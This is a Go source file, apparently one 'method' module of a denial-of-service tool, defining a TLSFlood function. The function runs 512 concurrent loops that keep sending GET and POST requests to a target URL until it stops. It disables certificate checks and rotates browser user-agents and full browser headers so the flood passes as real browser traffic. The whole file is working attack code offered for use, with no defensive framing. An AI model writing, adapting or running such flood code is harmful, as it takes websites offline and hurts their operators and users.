package methods

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"time"
)

// TLSFlood - Enhanced net/http Flood
func TLSFlood(ctx context.Context, urlStr string, sec int) {
	fmt.Printf("[%s] TLS (Enhanced) Attack started on %s for %ds\n",
		time.Now().Format("15:04:05"), urlStr, sec)

	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
	}

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
			CipherSuites: []uint16{
				tls.TLS_AES_128_GCM_SHA256,
				tls.TLS_AES_256_GCM_SHA384,
				tls.TLS_CHACHA20_POLY1305_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			},
		},
		DialContext: (&net.Dialer{
			Timeout:   5 * time.Second,
			KeepAlive: 60 * time.Second,
		}).DialContext,
		MaxIdleConns:        0, // Unlimited
		MaxIdleConnsPerHost: 1000,
		DisableCompression:  false, // Keep enabled for realism
		DisableKeepAlives:   false,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
	}

	for i := 0; i < 512; i++ {
		go func() {
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				// Randomize HTTP Method
				method := "GET"
				if rand.Intn(10) > 7 {
					method = "POST"
				}

				req, err := http.NewRequest(method, urlStr, nil)
				if err != nil {
					continue
				}

				req.Header.Set("User-Agent", agents[rand.Intn(len(agents))])
				req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
				req.Header.Set("Accept-Language", "en-US,en;q=0.9")
				req.Header.Set("Accept-Encoding", "gzip, deflate, br")
				req.Header.Set("Cache-Control", "no-cache")
				req.Header.Set("Pragma", "no-cache")
				req.Header.Set("Sec-Ch-Ua", "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"")
				req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
				req.Header.Set("Sec-Ch-Ua-Platform", "\"Windows\"")
				req.Header.Set("Sec-Fetch-Dest", "document")
				req.Header.Set("Sec-Fetch-Mode", "navigate")
				req.Header.Set("Sec-Fetch-Site", "none")
				req.Header.Set("Sec-Fetch-User", "?1")
				req.Header.Set("Upgrade-Insecure-Requests", "1")
				req.Header.Set("Connection", "keep-alive")

				resp, err := client.Do(req)
				if err != nil {
					continue
				}
				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
			}
		}()
	}
	<-ctx.Done()
	fmt.Printf("[%s] TLS Attack finished.\n", time.Now().Format("15:04:05"))
}
